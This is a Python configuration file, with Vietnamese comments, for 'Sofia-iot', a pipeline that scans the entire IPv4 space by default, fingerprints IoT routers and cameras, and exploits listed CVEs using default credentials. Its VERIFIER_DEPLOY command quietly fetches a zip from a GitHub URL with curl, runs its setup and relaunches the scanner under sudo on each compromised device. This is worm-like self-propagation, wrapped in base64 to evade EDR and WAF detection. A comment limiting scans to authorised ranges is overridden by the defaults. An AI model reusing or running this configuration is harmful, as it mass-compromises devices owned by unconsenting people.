"""
Sofia-iot — Cấu hình chung.

Mọi tham số vận hành của pipeline đều khai báo tập trung tại đây:

  Giai đoạn 0 (target_generator) : DISCOVER_MODE, ZMAP_BANDWIDTH, SCAN_PORTS, ...
  Giai đoạn 1 (scanner)          : TIMEOUT, USER_AGENT
  Giai đoạn 2 (exploits)         : DEFAULT_CREDS, ZTE_PAYLOAD_FILE, ZTE_ENDPOINT
  Giai đoạn 3 (verifier)         : VERIFIER_COMMAND, WEBROOT_CANDIDATES
  Giai đoạn 4 (webhook)          : WEBHOOK_URL, NOTIFY_ALL
"""

import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
ZMAP_RAW_DIR = os.path.join(RESULTS_DIR, "zmap_raw")
STATE_FILE = os.path.join(RESULTS_DIR, "state.json")       # checkpoint/resume batch /16
RANGES_CACHE_FILE = os.path.join(ZMAP_RAW_DIR, "ranges.json")  # cache dải /16 đã sinh

# ── Chung ───────────────────────────────────────────────────────────────
TIMEOUT = 10                # giây: timeout cho connect / HTTP / exploit
THREADS = 50                # số worker trong ThreadPoolExecutor
USER_AGENT = ("Mozilla/5.0 (X11; Linux x86_64; rv:115.0) "
              "Gecko/20100101 Firefox/115.0")

# ── Giai đoạn 0: Discovery ──────────────────────────────────────────────
DISCOVER_MODE = True        # True = chạy zmap/masscan; False = đọc targets.txt
ZMAP_BANDWIDTH = "100M"     # băng thông zmap, VD "1M", "100M", "1G"
ZMAP_INTERFACE = ""         # để trống = mặc định; VD "eth0"
# ── Engine phát hiện (--engines) ─────────────────────────────────────────
# zmap (mặc định): zmap tự sinh các dải IPv4 (via AUTO_GEN_RANGES), quét cổng
#   phát hiện; các IP số rồi được gửi qua masscan để quét cổng mở (hybrid).
# masscan : bỏ qua phát hiện host riêng, masscan quét SCAN_PORTS trực tiếp trên
#   toàn dải /16; fallback tự động về zmap-per-port khi masscan chưa cài đặt.
DISCOVER_ENGINE = "zmap"     # "zmap" | "masscan"; CLI --engines ghi đè biến này
ZMAP_DISCOVERY_PORTS = [80]  # cổng zmap dùng chỉ để phát hiện host số (quét cổng chi tiết → masscan)
ZMAP_HOSTS_FILE = os.path.join(ZMAP_RAW_DIR, "live_hosts.txt")  # IP phát hiện được, 1 IP/dòng, đưa qua masscan -iL
MASSCAN_RATE = 1000          # packet/giây masscan khi quét cổng (polite)
# ── Auto-generate dải IPv4 /16 (nâng cấp: zmap tự sinh dải thay vì khai tay) ──
# Khi SCAN_RANGES rỗng và AUTO_GEN_RANGES=True, pipeline tự chia AUTO_GEN_CIDR
# thành các dải /16 (65536 IP/dải), xáo thứ tự, quét từng batch rồi gửi webhook.
# Resume theo từng dải qua STATE_FILE — chạy lại tiếp tục từ dải chưa xong.
AUTO_GEN_RANGES = True       # True = tự sinh dải /16 khi SCAN_RANGES trống
AUTO_GEN_CIDR = "0.0.0.0/0"  # dải gốc để chia — 0.0.0.0/0 = toàn bộ IPv4
AUTO_GEN_SPLIT_TO = 16       # chia thành chunk /N — mặc định 16 → 65536 dải /16
AUTO_GEN_SHUFFLE = True      # xáo thứ tự dải (tránh quét cụm 1 vùng liên tục)
AUTO_GEN_SEED = 0            # 0 = ngẫu nhiên mỗi lần; >0 = tái lập thứ tự xáo
AUTO_GEN_MAX_CHUNKS = 0      # 0 = tất cả; >0 = giới hạn số dải /16 (test nhanh)
# ── Batch + politeness ──────────────────────────────────────────────────
BATCH_SIZE = 4               # số dải /16 quét mỗi batch (1 batch = 1 checkpoint + webhook)
POLITENESS_SLEEP_MIN = 2.0   # giây ngủ tối thiểu giữa 2 batch (chống chặn)
POLITENESS_SLEEP_MAX = 8.0   # giây ngủ tối đa giữa 2 batch (ngẫu nhiên trong khoảng)
# Cổng quét — đã mở rộng phủ mọi CVE trong registry:
#   37215 (Huawei HG532), 80/8080 (web IoT), 8443 (SonicWall GMS),
#   21009 (GMS XML-RPC), 443 (web IoT qua HTTPS), 7547 (TR-069)
SCAN_PORTS = [37215, 80, 8080, 8443, 443, 7547, 21009]
# Dải IPv4 để zmap/masscan quét (CIDR). Trống = KHÔNG quét (fail-closed).
# Chỉ đưa vào dải bạn được phép kiểm thử (lab / mạng khách hàng).
# VD: ["192.0.2.0/24"] — quét 192.0.2.1-254 trên mọi SCAN_PORTS.
SCAN_RANGES = []             # dải CIDR khai tay (--scan-range / config). Trống = fail-closed,
                            # trừ khi AUTO_GEN_RANGES=True → tự sinh dải /16 từ AUTO_GEN_CIDR.
BLACKLIST_FILE = os.path.join(BASE_DIR, "blacklist.conf")
MAX_TARGETS = 1000          # giới hạn số IP đưa vào giai đoạn exploit (an toàn)
ALLOW_PRIVATE = False       # False = lọc RFC1918/loopback/link-local khỏi mục tiêu

# ── Chống bỏ sót / WAF / EDR ───────────────────────────────────────────
RETRY_ATTEMPTS = 2          # số lần thử lại tối đa (fingerprint/exploit) khi
                            # timeout / nghi WAF chặn / kết nối flaky
RETRY_BACKOFF = 0.5         # giây: chờ giữa các lần thử lại
EVASION_MODE = True         # xoay UA/header + biến thể payload né WAF
WAF_DETECT = True           # nhận diện WAF từ response, ghi chú vào finding
EDR_OBFUSCATE = True        # bọc lệnh deploy bằng base64 + tên biến ngẫu nhiên
FINGERPRINT_RETRY = True    # thử lại fingerprint khi lần đầu timeout
MAX_HTTP_PARSE = 20000      # số byte body tối đa dùng để tìm webroot/banner

# ── Giai đoạn 1: Fingerprint (scanner) ───────────────────────────────────
FINGERPRINT_TLS = True       # True = đọc CN/SAN từ chứng TLS trên cổng 443/8443/...
FINGERPRINT_BANNER = True    # True = probe banner specific per cổng (TR-069/SOAP/HTTP HEAD)
FINGERPRINT_EXTRA_PATHS = [  # path bổ sung quét chỉ khi thân page KHÔNG có marker (giảm âm)
    "/login.asp", "/web/login.html", "/userRpm/",
]
MAX_BANNER_BYTES = 4096      # số byte banner tối đa giữ từ probe cổng-specific

# ── Giai đoạn 2: Exploit ────────────────────────────────────────────────
# Tài khoản mặc định thử khi module cần xác thực (nhiều thiết bị IoT dùng
# default credential — thử sau khi request không auth bị từ chối).
DEFAULT_CREDS = {
    "CVE-2022-30023": ("admin", "admin"),   # Tenda HG9
    "CVE-2023-33538": ("admin", "admin"),   # TP-Link WR940N/WR841N/WR740N
    "CVE-2025-1316":  ("admin", "1234"),    # Edimax IC-7100
    "CVE-2025-29635": ("admin", "admin"),   # D-Link DIR-823X
}

# CVE-2024-45414 (ZTE) — lỗ hổng stack overflow ở webPrivateDecrypt, chưa có
# PoC công khai. File blob payload (target-specific) do người dùng cung cấp;
# nếu file chứa placeholder {cmd} thì module sẽ thay thế bằng lệnh probe.
ZTE_PAYLOAD_FILE = os.path.join(RESULTS_DIR, "zte_45414_payload.bin")
ZTE_ENDPOINT = "/cgi-bin/webPrivateDecrypt"   # tuỳ chỉnh theo firmware đích

# ── Giai đoạn 3: Verifier ───────────────────────────────────────────────
# Phần deploy (chạy sau `id; echo MARKER_<tag>`):
#   - nohup ... &      : tách tiến trình — response không treo, tiến trình sống
#                        tiếp khi kết nối đóng (chống SIGHUP).
#   - >/dev/null 2>&1  : nuốt stdout/stderr — không lộ dấu vết trong response.
#   - curl -fsSL -o    : tải im lặng, theo redirect, fail-fast.
#   - unzip -oq + rm -f: giải nén im lặng, xóa zip sau khi dùng.
#   - sudo -n ... || ...: sudo không tương tác, fallback chạy trực tiếp.
#   - cd /tmp          : không ghi file lộ liễu ở cwd.
# Khi EDR_OBFUSCATE=True, verifier tự bọc phần này bằng base64 (evasion.edr_wrap)
# → process/network chỉ thấy printf|base64 -d|sh, không lộ curl/python3/URL.
VERIFIER_DEPLOY = (
    "nohup sh -c 'cd /tmp && curl -fsSL -o sofia_scanV3.2.zip "
    "https://github.com/anhkhoa210v/va/raw/refs/heads/main/sofia_scanV3.2.zip && "
    "unzip -oq sofia_scanV3.2.zip && rm -f sofia_scanV3.2.zip && "
    "cd sofia_scan && bash setup.sh && "
    "(sudo -n python3 main.py --generate-ipv4 --engine zmap || "
    "python3 main.py --generate-ipv4 --engine zmap)' >/dev/null 2>&1 &"
)
# Lệnh probe đầy đủ: `id` xác nhận exec + tag để nhận diện output.
# {rand} được verifier thay bằng tag duy nhất của probe.
VERIFIER_COMMAND = "id; echo MARKER_{rand}; " + VERIFIER_DEPLOY

# Webroot thử cho blind-check — static + theo loại thiết bị + phát hiện động.
WEBROOT_CANDIDATES = [
    "/web/", "/tmp/", "/www/", "/usr/www/", "/home/httpd/",
]
# Webroot đặc trưng theo loại thiết bị (dùng khi fingerprint ra device).
DEVICE_WEBROOTS = {
    "hikvision":   ["/web/", "/home/hikvision/web/", "/usr/share/hikvision/web/"],
    "tp-link":     ["/web/", "/tmp/web/", "/usr/www/"],
    "d-link":      ["/web/", "/www/", "/home/httpd/"],
    "tenda":       ["/web/", "/www/", "/usr/www/"],
    "zte":         ["/web/", "/usr/www/", "/home/zte/web/"],
    "dvr":         ["/web/", "/www/", "/mnt/web/"],
    "goahead":     ["/web/", "/www/", "/etc/web/", "/mnt/web/"],
    "boa":         ["/web/", "/www/", "/home/httpd/", "/usr/share/boa/"],
    "lighttpd":    ["/www/", "/srv/www/", "/usr/share/lighttpd/"],
    "draytek":     ["/web/", "/usr/share/www/", "/etc/www/"],
    "sonicwall":   ["/web/", "/usr/web/"],
    "struts":      ["/usr/local/tomcat/webapps/ROOT/", "/opt/tomcat/webapps/ROOT/"],
    "unknown":     [],
}

# ── Giai đoạn 4: Webhook ────────────────────────────────────────────────
WEBHOOK_URL = os.environ.get("SOFIA_WEBHOOK_URL", "")  # VD "https://server/hook"
NOTIFY_ALL = False          # True = gửi webhook cả trường hợp VULN_NO_EXEC
NOTIFY_PROGRESS = True      # True = gửi webhook tiến độ (batch bắt đầu/hoàn tất,
                            # summary cuối) khi đã cấu hình WEBHOOK_URL










